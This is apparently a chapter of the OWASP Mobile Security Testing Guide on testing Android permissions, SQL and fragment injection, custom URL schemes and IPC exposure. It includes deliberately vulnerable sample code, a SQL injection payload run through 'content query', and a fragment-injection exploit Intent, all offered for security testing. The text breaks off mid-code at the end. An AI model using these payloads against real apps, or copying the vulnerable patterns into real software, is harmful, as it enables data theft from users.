## Android Platform APIs

### Testing App Permissions (MSTG-PLATFORM-1)

#### Overview

Android assigns a distinct system identity (Linux user ID and group ID) to every installed app. Because each Android app operates in a process sandbox, apps must explicitly request access to resources and data that are outside their sandbox. They request this access by declaring the permissions they need to use system data and features. Depending on how sensitive or critical the data or feature is, the Android system will grant the permission automatically or ask the user to approve the request.

Android permissions are classified into four different categories on the basis of the protection level they offer:

- **Normal**: This permission gives apps access to isolated application-level features with minimal risk to other apps, the user, and the system. For apps targeting SDK 23 or higher, these permissions are granted automatically at install time. For apps targeting a lower SDK, the user needs to approve them at install time. Example: `android.permission.INTERNET`
- **Dangerous**: This permission usually gives the app control over user data or control over the device in a way that impacts the user. This type of permission may not be granted at installation time; whether the app should have the permission may be left for the user to decide. Example: `android.permission.RECORD_AUDIO`
Note that starting at Android 8, If an app requests a permission at runtime, the system will grant the explicit permission, instead of all the permissions which belong to the same permission group as the requested one.
- **Signature**: This permission is granted only if the requesting app was signed with the same certificate used to sign the app that declared the permission. If the signature matches, the permission will be granted automatically. This permission is granted at install time. Example: `android.permission.ACCESS_MOCK_LOCATION`
- **SystemOrSignature**: This permission is granted only to applications embedded in the system image or signed with the same certificate used to sign the application that declared the permission. Example: `android.permission.ACCESS_DOWNLOAD_MANAGER`

A list of all permissions is in the [Android developer documentation](https://developer.android.com/guide/topics/permissions/requesting.html "Android Permissions").

Note that starting at Android 8 the permissions bellow contain the following changes:

- READ_CONTACTS : When an app request this permission, queries for usage data will return approximations rather than exact values.
- GET_ACCOUNTs : Apps no longer get access to user accounts with this permission unless the authenticator owns the accounts or the user grants that access.

#### Activity Permission Enforcement

Permissions are applied via `android:permission` attribute within the `<activity>` tag in the manifest. These permissions restrict which applications can start that Activity. The permission is checked during `Context.startActivity()` and `Activity.startActivityForResult()`. Not holding the required permission results in a `SecurityException` being thrown from the call.

#### Service Permission Enforcement

Permissions applied via `android:permission` attribute within the `<service>` tag in the manifest restrict who can start or bind to the associated Service. The permission is checked during `Context.startService()`, `Context.stopService()` and `Context.bindService()`. Not holding the required permission results in a `SecurityException` being thrown from the call.

#### Broadcast Permission Enforcement

Permissions applied via `android:permission` attribute within the `<receiver>` tag restrict access to send broadcasts to the associated BroadcastReceiver. The held permissions are checked after `Context.sendBroadcast()` returns, while trying to deliver the sent broadcast to the given receiver. Please note failure to hold proper permissions doesn't throw an exception, the result is an unsent broadcast.

A permission can be supplied to `Context.registerReceiver()` to control who can broadcast to a programmatically registered receiver. Going the other way, a permission can be supplied when calling `Context.sendBroadcast()` to restrict which broadcast receivers are allowed to receive the broadcast.

Note that both a receiver and a broadcaster can require a permission. When this happens, both permission checks must pass for the intent to be delivered to the associated target. For more information, please reference [Restricting broadcasts with permissions](https://developer.android.com/guide/components/broadcasts#restricting_broadcasts_with_permissions).

#### Content Provider Permission Enforcement

Permissions applied via `android:permission` attribute within the `<provider>` tag restrict access to data in a ContentProvider. Content providers have an important additional security facility called URI permissions which is described next. Unlike the other components, ContentProviders have two separate permission attributes that can be set, `android:readPermission` restricts who can read from the provider, and `android:writePermission` restricts who can write to it. If a ContentProvider is protected with both read and write permissions, holding only the write permission does not also grant read permissions.

The permissions are checked when you first retrieve a provider (if you don't have either permission, a SecurityException is thrown), and as you perform operations on the provider. Using ContentResolver.query() requires holding the read permission; using ContentResolver.insert(), ContentResolver.update(), ContentResolver.delete() requires the write permission. In all of these cases, not holding the required permission results in a SecurityException being thrown from the call.

Permissions are checked when you first retrieve a provider and as operations are performed using the ContentProvider. Using `ContentResolver.query()` requires holding the read permission; using `ContentResolver.insert()`, `ContentResolver.update()`, `ContentResolver.delete()` requires the write permission. A `SecurityException` will be thrown from the call if proper permissions are not held in all these cases.

#### Content Provider URI Permissions

The standard permission system is not sufficient when being used with content providers. For example a content provider may want to limit permissions to READ permissions in order to protect itself, while using custom URIs to retrieve information. An application should only have the permission for that specific URI.

The solution is per-URI permissions. When starting or returning a result from an activity, the method can set `Intent.FLAG_GRANT_READ_URI_PERMISSION` and/or `Intent.FLAG_GRANT_WRITE_URI_PERMISSION`. This grants permission to the activity for
the specific URI regardless if it has permissions to access to data from the content provider.

This allows a common capability-style model where user interaction drives ad-hoc granting of fine-grained permission. This can be a key facility for reducing the permissions needed by apps to only those directly related to their behavior. Without this model in place malicious users may access other member's email attachments or harvest contact lists for future use via unprotected URIs. In the manifest the `android:grantUriPermissions` attribute or the node help restrict the URIs.

#### Documentation for URI permissions

 [grantUriPermission()](https://developer.android.com/guide/topics/manifest/provider-element#gprmsn), [revokeUriPermission()](https://developer.android.com/reference/android/content/Context#revokeUriPermission(android.net.Uri,%20int)), and [checkUriPermission()](https://developer.android.com/reference/android/content/Context#checkUriPermission(android.net.Uri,%20int,%20int,%20int)).

##### Custom Permissions

Android allows apps to expose their services/components to other apps. Custom permissions are required for app access to the exposed components. You can define [custom permissions](https://developer.android.com/guide/topics/permissions/defining.html "Custom Permissions") in `AndroidManifest.xml` by creating a permission tag with two mandatory attributes: `android:name` and `android:protectionLevel`.

It is crucial to create custom permissions that adhere to the *Principle of Least Privilege*: permission should be defined explicitly for its purpose, with a meaningful and accurate label and description.

Below is an example of a custom permission called `START_MAIN_ACTIVITY`, which is required when launching the `TEST_ACTIVITY` Activity.

The first code block defines the new permission, which is self-explanatory. The label tag is a summary of the permission, and the description is a more detailed version of the summary. You can set the protection level according to the types of permissions that will be granted. Once you've defined your permission, you can enforce it by adding it to the application's manifest. In our example, the second block represents the component that we are going to restrict with the permission we created. It can be enforced by adding the `android:permission` attributes.

```xml
<permission android:name="com.example.myapp.permission.START_MAIN_ACTIVITY"
        android:label="Start Activity in myapp"
        android:description="Allow the app to launch the activity of myapp app, any app you grant this permission will be able to launch main activity by myapp app."
        android:protectionLevel="normal" />

<activity android:name="TEST_ACTIVITY"
    android:permission="com.example.myapp.permission.START_MAIN_ACTIVITY">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER"/>
     </intent-filter>
</activity>
```

Once the permission `START_MAIN_ACTIVTY` has been created, apps can request it via the `uses-permission` tag in the `AndroidManifest.xml` file. Any application granted the custom permission `START_MAIN_ACTIVITY` can then launch the `TEST_ACTIVITY`. Please note `<uses-permission android:name="myapp.permission.START_MAIN_ACTIVITY"/>` must be declared before the `<application>` or an exception will occur at runtime. Please see the example below that is based on the [permission overview](https://developer.android.com/guide/topics/permissions/overview "permission overview") and [manifest-intro](https://developer.android.com/guide/topics/manifest/manifest-intro#filestruct  "manifest-intro").

```xml
<manifest>
<uses-permission android:name="com.example.myapp.permission.START_MAIN_ACTIVITY"/>
        <application>
            <activity>
            </activity>
        </application>
</manifest>
```

#### Static Analysis

##### Android Permissions

Check permissions to make sure that the app really needs them and remove unnecessary permissions. For example, the `INTERNET` permission in the AndroidManifest.xml file is necessary for an Activity to load a web page into a WebView. Because a user can revoke an application's right to use a dangerous permission, the developer should check whether the application has the appropriate permission each time an action is performed that would require that permission.

```xml
<uses-permission android:name="android.permission.INTERNET" />
```

Go through the permissions with the developer to identify the purpose of every permission set and remove unnecessary permissions.

Besides going through the AndroidManifest.xml file manually, you can also use the Android Asset Packaging tool to examine permissions.

```shell
$ aapt d permissions com.owasp.mstg.myapp
uses-permission: android.permission.WRITE_CONTACTS
uses-permission: android.permission.CHANGE_CONFIGURATION
uses-permission: android.permission.SYSTEM_ALERT_WINDOW
uses-permission: android.permission.INTERNAL_SYSTEM_WINDOW
```

Please reference this [permissions overview](https://developer.android.com/guide/topics/permissions/overview#permission-groups) for descriptions of the listed permissions that are considered dangerous.

```text
READ_CALENDAR,
WRITE_CALENDAR,
READ_CALL_LOG,
WRITE_CALL_LOG,
PROCESS_OUTGOING_CALLS,
CAMERA,
READ_CONTACTS,
WRITE_CONTACTS,
GET_ACCOUNTS,
ACCESS_FINE_LOCATION,
ACCESS_COARSE_LOCATION,
RECORD_AUDIO,
READ_PHONE_STATE,
READ_PHONE_NUMBERS,
CALL_PHONE,
ANSWER_PHONE_CALLS,
ADD_VOICEMAIL,
USE_SIP,
BODY_SENSORS,
SEND_SMS,
RECEIVE_SMS,
READ_SMS,
RECEIVE_WAP_PUSH,
RECEIVE_MMS,
READ_EXTERNAL_STORAGE,
WRITE_EXTERNAL_STORAGE.
```

##### Custom Permissions

Apart from enforcing custom permissions via the application manifest file, you can also check permissions programmatically. This is not recommended, however, because it is more error-prone and can be bypassed more easily with, e.g., runtime instrumentation. It is recommended that the ContextCompat.checkSelfPermission() method is called to check if an activity has a specified permission. Whenever you see code like the following snippet, make sure that the same permissions are enforced in the manifest file.

```java
private static final String TAG = "LOG";
int canProcess = checkCallingOrSelfPermission("com.example.perm.READ_INCOMING_MSG");
if (canProcess != PERMISSION_GRANTED)
throw new SecurityException();
```

Or with `ContextCompat.checkSelfPermission()` which compares it to the manifest file.

```java
if (ContextCompat.checkSelfPermission(secureActivity.this, Manifest.READ_INCOMING_MSG)
        != PackageManager.PERMISSION_GRANTED) {
            //!= stands for not equals PERMISSION_GRANTED
            Log.v(TAG, "Permission denied");
        }
```

#### Requesting Permissions

If your application has permissions that need to be requested at runtime, the application must call a `requestPermissions()` method in order to obtain them. The app passes the permissions needed and an integer request code you have specified to the user asynchronously, returning once the user chooses to accept or deny the request in the same thread. After the response is returned the same request code is passed to the app's callback method.

```java
private static final String TAG = "LOG";
// We start by checking the permission of the current Activity
if (ContextCompat.checkSelfPermission(secureActivity.this,
        Manifest.permission.WRITE_EXTERNAL_STORAGE)
        != PackageManager.PERMISSION_GRANTED) {

    // Permission is not granted
    // Should we show an explanation?
    if (ActivityCompat.shouldShowRequestPermissionRationale(secureActivity.this,
        //Gets whether you should show UI with rationale for requesting permission.
        //You should do this only if you do not have permission and the permission requested rationale is not communicated clearly to the user.
            Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
        // Asynchronous thread waits for the users response.
        // After the user sees the explanation try requesting the permission again.
    } else {
        // Request a permission that doesn't need to be explained.
        ActivityCompat.requestPermissions(secureActivity.this,
                new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},
                MY_PERMISSIONS_REQUEST_WRITE_EXTERNAL_STORAGE);
        // MY_PERMISSIONS_REQUEST_WRITE_EXTERAL_STORAGE will be the app-defined int constant.
        // The callback method gets the result of the request.
    }
} else {
    // Permission already granted debug message printed in terminal.
    Log.v(TAG, "Permission already granted.");
}
```

Please note that if you need to provide any information or explanation to the user it needs to be done before the call to `requestPermissions()`, since the system dialog box can not be altered once called.

#### Handling the permissions response

Now your app has to override the system method `onRequestPermissionsResult()` to see if the permission was granted. This is where the same request code is passed that was created in `requestPermissions()`.

The following callback method may be used for `WRITE_EXTERNAL_STORAGE`.

```java
@Override //Needed to override system method onRequestPermissionsResult()
public void onRequestPermissionsResult(int requestCode, //requestCode is what you specified in requestPermissions()
        String permissions[], int[] permissionResults) {
    switch (requestCode) {
        case MY_PERMISSIONS_WRITE_EXTERNAL_STORAGE: {
            if (grantResults.length > 0
                && permissionResults[0] == PackageManager.PERMISSION_GRANTED) {
                // 0 is a canceled request, if int array equals requestCode permission is granted.
            } else {
                // permission denied code goes here.
                Log.v(TAG, "Permission denied");
            }
            return;
        }
        // Other switch cases can be added here for multiple permission checks.
    }
}

```

Permissions should be explicitly requested for every needed permission, even if a similar permission from the same group has already been requested. For applications targeting Android 7.1 (API level 25) and older, Android will automatically give an application all the permissions from a permission group, if the user grants one of the requested permissions of that group. Starting with Android 8.0 (API level 26), permissions will still automatically be granted if a user has already granted a permission from the same permission group, but the application still needs to explicitly request the permission. In this case, the `onRequestPermissionsResult` handler will automatically be triggered without any user interaction.

For example if both `READ_EXTERNAL_STORAGE` and `WRITE_EXTERNAL_STORAGE` are listed in the app manifest but only permissions are granted for `READ_EXTERNAL_STORAGE`, then requesting `WRITE_LOCAL_STORAGE` will automatically have permissions without user interaction because they are in the same group and not explicitly requested.

#### Permission Analysis

Always check whether the application is requesting permissions it actually needs. Make sure that no permissions are requested which are not related to the goal of the app. For instance: a single-player game that requires access to `android.permission.WRITE_SMS`, might not be a good idea.

#### Dynamic Analysis

Permissions for installed applications can be retrieved with Drozer. The following extract demonstrates how to examine the permissions used by an application and the custom permissions defined by the app:

```shell
dz> run app.package.info -a com.android.mms.service
Package: com.android.mms.service
  Application Label: MmsService
  Process Name: com.android.phone
  Version: 6.0.1
  Data Directory: /data/user/0/com.android.mms.service
  APK Path: /system/priv-app/MmsService/MmsService.apk
  UID: 1001
  GID: [2001, 3002, 3003, 3001]
  Shared Libraries: null
  Shared User ID: android.uid.phone
  Uses Permissions:
  - android.permission.RECEIVE_BOOT_COMPLETED
  - android.permission.READ_SMS
  - android.permission.WRITE_SMS
  - android.permission.BROADCAST_WAP_PUSH
  - android.permission.BIND_CARRIER_SERVICES
  - android.permission.BIND_CARRIER_MESSAGING_SERVICE
  - android.permission.INTERACT_ACROSS_USERS
  Defines Permissions:
  - None
```

When Android applications expose IPC components to other applications, they can define permissions to control which applications can access the components. For communication with a component protected by a `normal` or `dangerous` permission, Drozer can be rebuilt so that it includes the required permission:

```shell
$ drozer agent build  --permission android.permission.REQUIRED_PERMISSION
```

Note that this method can't be used for `signature` level permissions because Drozer would need to be signed by the certificate used to sign the target application.

When doing the dynamic analysis: validate whether the permission requested by the app is actually necessary for the app. For instance: a single-player game that requires access to `android.permission.WRITE_SMS`, might not be a good idea.

### Testing for Injection Flaws (MSTG‑PLATFORM‑2)

#### Overview

Android apps can expose functionality through custom URL schemes (which are a part of Intents). They can expose functionality to

- other apps (via IPC mechanisms, such as Intents, Binders, Android Shared Memory (ASHMEM), or BroadcastReceivers),
- the user (via the user interface).

None of the input from these sources can be trusted; it must be validated and/or sanitized. Validation ensures processing of data that the app is expecting only. If validation is not enforced, any input can be sent to the app, which may allow an attacker or malicious app to exploit app functionality.

The following portions of the source code should be checked if any app functionality has been exposed:

- Custom URL schemes. Check the test case "Testing Custom URL Schemes" as well for further test scenarios.
- IPC Mechanisms (Intents, Binders, Android Shared Memory, or BroadcastReceivers). Check the test case "Testing Whether Sensitive Data Is Exposed via IPC Mechanisms" as well for further test scenarios.
- User interface

An example of a vulnerable IPC mechanism is shown below.

You can use *ContentProviders* to access database information, and you can probe services to see if they return data. If data is not validated properly, the content provider may be prone to SQL injection while other apps are interacting with it. See the following vulnerable implementation of a *ContentProvider*.

```xml
<provider
    android:name=".OMTG_CODING_003_SQL_Injection_Content_Provider_Implementation"
    android:authorities="sg.vp.owasp_mobile.provider.College">
</provider>
```

The `AndroidManifest.xml` above defines a content provider that's exported and therefore available to all other apps. The `query` function in the `OMTG_CODING_003_SQL_Injection_Content_Provider_Implementation.java` class should be inspected.

```java
@Override
public Cursor query(Uri uri, String[] projection, String selection,String[] selectionArgs, String sortOrder) {
    SQLiteQueryBuilder qb = new SQLiteQueryBuilder();
    qb.setTables(STUDENTS_TABLE_NAME);

    switch (uriMatcher.match(uri)) {
        case STUDENTS:
            qb.setProjectionMap(STUDENTS_PROJECTION_MAP);
            break;

        case STUDENT_ID:
            // SQL Injection when providing an ID
            qb.appendWhere( _ID + "=" + uri.getPathSegments().get(1));
            Log.e("appendWhere",uri.getPathSegments().get(1).toString());
            break;

        default:
            throw new IllegalArgumentException("Unknown URI " + uri);
    }

    if (sortOrder == null || sortOrder == ""){
        /**
         * By default sort on student names
         */
        sortOrder = NAME;
    }
    Cursor c = qb.query(db, projection, selection, selectionArgs,null, null, sortOrder);

    /**
     * register to watch a content URI for changes
     */
    c.setNotificationUri(getContext().getContentResolver(), uri);
    return c;
}
```

While the user is providing a STUDENT_ID at `content://sg.vp.owasp_mobile.provider.College/students`, the query statement is prone to SQL injection. Obviously [prepared statements](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet "OWASP SQL Injection Cheat Sheet") must be used to avoid SQL injection, but [input validation](https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet "OWASP Input Validation Cheat Sheet") should also be applied so that only input that the app is expecting is processed.

All app functions that process data coming in through the UI should implement input validation:

- For user interface input, [Android Saripaar v2](https://github.com/ragunathjawahar/android-saripaar "Android Saripaar v2") can be used.
- For input from IPC or URL schemes, a validation function should be created. For example, the following determines whether the [string is alphanumeric](https://stackoverflow.com/questions/11241690/regex-for-checking-if-a-string-is-strictly-alphanumeric "Input Validation"):

```java
public boolean isAlphaNumeric(String s){
    String pattern= "^[a-zA-Z0-9]*$";
    return s.matches(pattern);
}
```

An alternative to validation functions is type conversion, with, for example, `Integer.parseInt` if only integers are expected. The [OWASP Input Validation Cheat Sheet](https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet "OWASP Input Validation Cheat Sheet") contains more information about this topic.

#### Dynamic Analysis

The tester should manually test the input fields with strings like `OR 1=1--` if, for example, a local SQL injection vulnerability has been identified.

On a rooted device, the command content can be used to query the data from a Content Provider. The following command queries the vulnerable function described above.

```shell
# content query --uri content://sg.vp.owasp_mobile.provider.College/students
```

SQL injection can be exploited with the following command. Instead of getting the record for Bob only, the user can retrieve all data.

```shell
# content query --uri content://sg.vp.owasp_mobile.provider.College/students --where "name='Bob') OR 1=1--''"
```

Drozer can also be used for dynamic testing.

### Testing for Fragment Injection (MSTG-PLATFORM-2)

#### Overview

Android SDK offers developers a way to present a [`Preferences activity`](https://developer.android.com/reference/android/preference/PreferenceActivity.html "Preference Activity") to users, allowing the developers to extend and adapt this abstract class.

This abstract class parses the extra data fields of an Intent, in particular, the `PreferenceActivity.EXTRA_SHOW_FRAGMENT(:android:show_fragment)` and `PreferenceActivity.EXTRA_SHOW_FRAGMENT_ARGUMENTS(:android:show_fragment_arguments)` fields.

The first field is expected to contain the `Fragment` class name, and the second one is expected to contain the input bundle passed to the `Fragment`.

Because the `PreferenceActivity` uses reflection to load the fragment, an arbitrary class may be loaded inside the package or the Android SDK. The loaded class runs in the context of the application that exports this activity.

With this vulnerability, an attacker can call fragments inside the target application or run the code present in other classes' constructors. Any class that's passed in the Intent and does not extend the Fragment class will cause a java.lang.CastException, but the empty constructor will be executed before the exception is thrown, allowing the code present in the class constructor run.

To prevent this vulnerability, a new method called `isValidFragment` was added in Android 4.4 KitKat (API Level 19). It allows developers to override this method and define the fragments that may be used in this context.

The default implementation returns true on versions older than Android 4.4 KitKat (API Level 19); it will throw an exception on later versions.

#### Static Analysis

Steps:

- Check if targetSdkVersion less than 19.
- Find exported Activities that extend the `PreferenceActivity` class.
- Determine whether the method isValidFragment has been overridden.
- If the app currently sets its targetSdkVersion in the manifest to a value less than 19 and the vulnerable class does not contain any implementation of isValidFragment then, the vulnerability is inherited from the PreferenceActivity.
- In order to fix, developers should either update the targetSdkVersion to 19 or higher. Alternatively, if the targetSdkVersion cannot be updated, then developers should implement isValidFragment as described.

The following example shows an Activity that extends this activity:

```java
public class MyPreferences extends PreferenceActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
    }
}
```

The following examples show the isValidFragment method being overridden with an implementation that allows the loading of MyPreferenceFragment only:

```Java
@Override
protected boolean isValidFragment(String fragmentName)
{
return "com.fullpackage.MyPreferenceFragment".equals(fragmentName);
}

```

#### Example of Vulnerable App and Exploitation

MainActivity.class

```Java
public class MainActivity extends PreferenceActivity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
    }
}
```

MyFragment.class

```Java
public class MyFragment extends Fragment {
    public void onCreate (Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
    }
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        View v = inflater.inflate(R.layout.fragmentLayout, null);
        WebView myWebView = (WebView) wv.findViewById(R.id.webview);
        myWebView.getSettings().setJavaScriptEnabled(true);
        myWebView.loadUrl(this.getActivity().getIntent().getDataString());
        return v;
    }
}
```

To exploit this vulnerable Activity, you can create an application with the following code:

```Java
Intent i = new Intent();
i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
i.setClassName("pt.claudio.insecurefragment","pt.claudio.insecurefragment.MainActivity");
i.putExtra(":android:show_fragment","pt.claudio.insecurefragment.MyFragment");
Intent intent = i.setData(Uri.parse("https://security.claudio.pt"));
startActivity(i);
```

The [`Vulnerable App`](https://github.com/clviper/android-fragment-injection/raw/master/vulnerableapp.apk "Vulnerable App Fragment Injection") and [`Exploit PoC App`](https://github.com/clviper/android-fragment-injection/blob/master/exploit.apk "PoC App to exploit Fragment Injection") are available for downloading.

### Testing Custom URL Schemes (MSTG-PLATFORM-3)

#### Overview

Both Android and iOS allow inter-app communication via custom URL schemes. These custom URLs allow other applications to perform specific actions within the application that offers the custom URL scheme. Custom URIs can begin with any scheme prefix, and they usually define an action to take within the application and parameters for that action.

Consider this contrived example: `sms://compose/to=your.boss@company.com&message=I%20QUIT!&sendImmediately=true`. When a victim clicks such a link on a mobile device, the vulnerable SMS application will send the SMS message with the maliciously crafted content. This could lead to

- financial loss for the victim if messages are sent to premium services or
- disclosure of the victim's phone number if messages are sent to predefined addresses that collect phone numbers.

Once a URL scheme has been defined, multiple apps can register for any available scheme. For every application, each of these custom URL schemes must be enumerated and the actions they perform must be tested.

URL schemes can be used for [deep linking](https://developer.android.com/training/app-links/ "Handling Android App Links"), a widespread and convenient way to launch a native mobile app via a link, which isn't inherently risky. Alternatively, since Android 6 App links can be used.

Nevertheless, data that's processed by the app and comes in through URL schemes should be validated as any content:

- When using reflection-based persistence type of data processing, check the section "Testing Object Persistence" for Android.
- Using the data for queries? Make sure you make parameterized queries.
- Using the data to do authenticated actions? Make sure that the user is in an authenticated state before the data is processed.
- If tampering of the data will influence the result of the calculations: add an HMAC to the data.

#### Static Analysis

Determine whether custom URL schemes are defined. This can be done in the AndroidManifest.xml file, inside of an [intent-filter element](https://developer.android.com/guide/components/intents-filters.html#DataTest "Custom URL scheme").

```xml
<activity android:name=".MyUriActivity">
  <intent-filter>
      <action android:name="android.intent.action.VIEW" />
      <category android:name="android.intent.category.DEFAULT" />
      <category android:name="android.intent.category.BROWSABLE" />
      <data android:scheme="myapp" android:host="path" />
  </intent-filter>
</activity>

```

The example above specifies a new URL scheme called `myapp://`. The category `browsable` will allow the URI to be opened within a browser.

Data can then be transmitted through this new scheme with, for example, the following URI: `myapp://path/to/what/i/want?keyOne=valueOne&keyTwo=valueTwo`. Code like the following can be used to retrieve the data:

```Java
Intent intent = getIntent();
if (Intent.ACTION_VIEW.equals(intent.getAction())) {
  Uri uri = intent.getData();
  String valueOne = uri.getQueryParameter("keyOne");
  String valueTwo = uri.getQueryParameter("keyTwo");
}
```

Verify the usage of [`toUri`](https://developer.android.com/reference/android/content/Intent.html#toUri%28int%29 "Intent.toUri()"), which may also be used in this context.

#### Dynamic Analysis

To enumerate URL schemes within an app that can be called by a web browser, use the Drozer module `scanner.activity.browsable`:

```shell
dz> run scanner.activity.browsable -a com.google.android.apps.messaging
Package: com.google.android.apps.messaging
  Invocable URIs:
    sms://
    mms://
  Classes:
    com.google.android.apps.messaging.ui.conversation.LaunchConversationActivity
```

You can call custom URL schemes with the Drozer module `app.activity.start`:

```shell
dz> run app.activity.start  --action android.intent.action.VIEW --data-uri "sms://0123456789"
```

When used to call a defined schema (myapp://someaction/?var0=string&var1=string), the module may also be used to send data to the app, as in the example below.

```Java
Intent intent = getIntent();
if (Intent.ACTION_VIEW.equals(intent.getAction())) {
  Uri uri = intent.getData();
  String valueOne = uri.getQueryParameter("var0");
  String valueTwo = uri.getQueryParameter("var1");
}
```

Defining and using your own URL scheme can be risky in this situation if data is sent to the scheme from an external party and processed in the app. Therefore keep in mind that data should be validated as described in "Testing custom URL schemes."

### Testing for Sensitive Functionality Exposure Through IPC (MSTG-PLATFORM-4)

#### Overview

During implementation of a mobile application, developers may apply traditional techniques for IPC (such as using shared files or network sockets). The IPC system functionality offered by mobile application platforms should be used because it is much more mature than traditional techniques. Using IPC mechanisms with no security in mind may cause the application to leak or expose sensitive data.

The following is a list of Android IPC Mechanisms that may expose sensitive data:

- [Binders](https://developer.android.com/reference/android/os/Binder.html "IPCBinder")
- [Services](https://developer.android.com/guide/components/services.html "IPCServices")
- [Bound Services](https://developer.android.com/guide/components/bound-services.html "BoundServices")
- [AIDL](https://developer.android.com/guide/components/aidl.html "AIDL")
- [Intents](https://developer.android.com/reference/android/content/Intent.html "IPCIntent")
- [Content Providers](https://developer.android.com/reference/android/content/ContentProvider.html "IPCContentProviders")

#### Static Analysis

We start by looking at the AndroidManifest.xml, where all activities, services, and content providers included in the source code must be declared (otherwise the system won't recognize them and they won't run). Broadcast receivers can be declared in the manifest or created dynamically. You will want to identify elements such as

- [`<intent-filter>`](https://developer.android.com/guide/topics/manifest/intent-filter-element.html "IntentFilterElement")
- [`<service>`](https://developer.android.com/guide/topics/manifest/service-element.html "ServiceElement")
- [`<provider>`](https://developer.android.com/guide/topics/manifest/provider-element.html "ProviderElement")
- [`<receiver>`](https://developer.android.com/guide/topics/manifest/receiver-element.html "ReceiverElement")

An "exported" activity, service, or content  can be accessed by other apps. There are two common ways to designate a component as exported. The obvious one is setting the export tag to true `android:exported="true"`. The second way involves defining an `<intent-filter>` within the component element (`<activity>`, `<service>`, `<receiver>`). When this is done, the export tag is automatically set to "true." To prevent all other Android apps from interacting with the IPC component element, be sure that the `android:exported="true"` value and an `<intent-filter>` aren't in their `AndroidManifest.xml` files unless this is necessary.

Remember that using the permission tag (`android:permission`) will also limit other applications' access to a component. If your IPC is intended to be accessible to other applications, you can apply a security policy with the `<permission>` element and set a proper `android:protectionLevel`. When `android:permission` is used in a service declaration, other applications must declare a corresponding `<uses-permission>` element in their own manifest to start, stop, or bind to the service.

For more information about the content providers, please refer to the test case "Testing Whether Stored Sensitive Data Is Exposed via IPC Mechanisms" in chapter "Testing Data Storage."

Once you identify a list of IPC mechanisms, review the source code to see whether sensitive data is leaked when the mechanisms are used. For example, content providers can be used to access database information, and services can be probed to see if they return data. Broadcast receivers can leak sensitive information if probed or sniffed.

In the following, we use two example apps and give examples of identifying vulnerable IPC components:

- ["Sieve"](https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk "Sieve: Vulnerable Password Manager")
- ["Android Insecure Bank"](https://github.com/dineshshetty/Android-InsecureBankv2 "Android Insecure Bank V2")

#### Activities

##### Inspect the AndroidManifest

In the "Sieve" app, we find three exported activities, identified by `<activity>`:

```xml
<activity android:excludeFromRecents="true" android:label="@string/app_name" android:launchMode="singleTask" android:name=".MainLoginActivity" android:windowSoftInputMode="adjustResize|stateVisible">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
<activity android:clearTaskOnLaunch="true" android:excludeFromRecents="true" android:exported="true" android:finishOnTaskLaunch="true" android:label="@string/title_activity_file_select" android:name=".FileSelectActivity"/>
<activity android:clearTaskOnLaunch="true" android:excludeFromRecents="true" android:exported="true" android:finishOnTaskLaunch="true" android:label="@string/title_activity_pwlist" android:name=".PWList"/>

```

##### Inspect the source code

By inspecting the `PWList.java` activity, we see that it offers options to list all keys, add, delete, etc. If we invoke it directly, we will be able to bypass the LoginActivity. More on this can be found in the dynamic analysis below.

#### Services

##### Inspect the AndroidManifest

In the "Sieve" app, we find two exported services, identified by `<service>`:

```xml
<service android:exported="true" android:name=".AuthService" android:process=":remote"/>
<service android:exported="true" android:name=".CryptoService" android:process=":remote"/>
```

##### Inspect the source code

Check the source code for the class `android.app.Service`:

By reversing the target application, we can see that the service `AuthService` provides functionality for changing the password and PIN-protecting the target app.

```java
   public void handleMessage(Message msg) {
            AuthService.this.responseHandler = msg.replyTo;
            Bundle returnBundle = msg.obj;
            int responseCode;
            int returnVal;
            switch (msg.what) {
                ...
                case AuthService.MSG_SET /*6345*/:
                    if (msg.arg1 == AuthService.TYPE_KEY) /*7452*/ {
                        responseCode = 42;
                        if (AuthService.this.setKey(returnBundle.getString("com.mwr.example.sieve.PASSWORD"))) {
                            returnVal = 0;
                        } else {
                            returnVal = 1;
                        }
                    } else if (msg.arg1 == AuthService.TYPE_PIN) {
                        responseCode = 41;
                        if (AuthService.this.setPin(returnBundle.getString("com.mwr.example.sieve.PIN"))) {
                            returnVal = 0;
                        } else {
                            returnVal = 1;
                        }
                    } else {
                        sendUnrecognisedMessage();
                        return;
                    }
           }
   }
```

##### Broadcast Receivers

##### Inspect the AndroidManifest

In the "Android Insecure Bank" app, we find a broadcast receiver in the manifest, identified by `<receiver>`:

```xml
<receiver android:exported="true" android:name="com.android.insecurebankv2.MyBroadCastReceiver">
    <intent-filter>
        <action android:name="theBroadcast"/>
    </intent-filter>
</receiver>
```

##### Inspect the source code

Search the source code for strings like `sendBroadcast`, `sendOrderedBroadcast`, and `sendStickyBroadcast`. Make sure that the application doesn't send any sensitive data.

If an Intent is broadcasted and received within the application only, `LocalBroadcastManager` can be used to prevent other apps from receiving the broadcast message. This reduces the risk of leaking sensitive information.

To understand more about what the receiver is intended to do, we have to go deeper in our static analysis and search for usage of the class `android.content.BroadcastReceiver` and the `Context.registerReceiver` method, which is used to dynamically create receivers.

The following extract of the target application's source code shows that the broadcast receiver triggers transmission of an SMS message containing the user's decrypted password.

```java
public class MyBroadCastReceiver extends BroadcastReceiver {
  String usernameBase64ByteString;
  public static final String MYPREFS = "mySharedPreferences";

  @Override
  public void onReceive(Context context, Intent intent) {
    // TODO Auto-generated method stub

        String phn = intent.getStringExtra("phonenumber");
        String newpass = intent.getStringExtra("newpass");

    if (phn != null) {
      try {
                SharedPreferences settings = context.getSharedPreferences(MYPREFS, Context.MODE_WORLD_READABLE);
                final String username = settings.getString("EncryptedUsername", null);
                byte[] usernameBase64Byte = Base64.decode(username, Base64.DEFAULT);
                usernameBase64ByteString = new String(usernameBase64Byte, "UTF-8");
